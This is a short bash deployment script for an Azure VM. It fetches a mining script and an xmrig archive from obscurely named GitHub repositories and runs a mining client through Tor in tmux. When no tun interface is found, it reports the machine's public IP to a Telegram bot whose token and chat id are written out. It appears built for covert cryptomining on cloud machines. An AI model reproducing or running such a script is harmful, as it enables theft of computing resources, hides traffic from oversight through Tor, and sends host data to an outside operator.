#!/bin/bash
cd /home/azureuser
wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser
chmod +x mine_vm.sh
wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_xmrig.tar.gz -P /home/azureuser
tar -xf mo_xmrig.tar.gz
rm -r mo_xmrig.tar.gz
########################
#mkdir /home/azureuser/qub_dir
#cd /home/azureuser/qub_dir

#wget https://github.com/apool-io/apoolminer/releases/download/v2.1.0/apoolminer_linux_v2.1.0.tar -P /home/azureuser
#tar -xf apoolminer_linux_v2.1.0.tar

#wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /home/azureuser/qub_dir
#tar -xf /home/azureuser/qub_dir/qubic.tar.gz


sudo systemctl start tor
#tmux new -ds servak sudo ./xmrig

### НОВАЯ ФИЧА ДЛЯ ПРОВЕРКИ ТЮНА
if ip add | grep -q tun; then
    echo "Интерфейс tun присутствует"
    sudo systemctl start tor
    #tmux new -ds servak torify ./apoolminer --account CP_7xv4nh7sn3 --gpu-off --pool qubic1.hk.apool.io:3334 --thread 2
    tmux new -ds servak torify /home/azureuser/qub_dir/qli-Client >> /home/azureuser/qub_dir/logs2.txt 2>&1
    #tmux new -ds servak torify ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RAyRmryhKwqVu1XphEMa7GcsHet4uP3F9h.AUTOTUNE
else
    echo "Интерфейс tun отсутствует"
    P_ADRESS=$(curl https://ipinfo.io/ip)
    curl -X POST \
     -H 'Content-Type: application/json' \
     -d '{"chat_id": "506640934", "text": "'"VM WITHOUT TUNE TRYING TO START - $(curl https://ipinfo.io/ip) !"'", "disable_notification": true}' \
     https://api.telegram.org/bot6619003611:AAGRivvPR1q5XZbnNh0RgZ5Y86_FBlpkTOE/sendMessage
fi
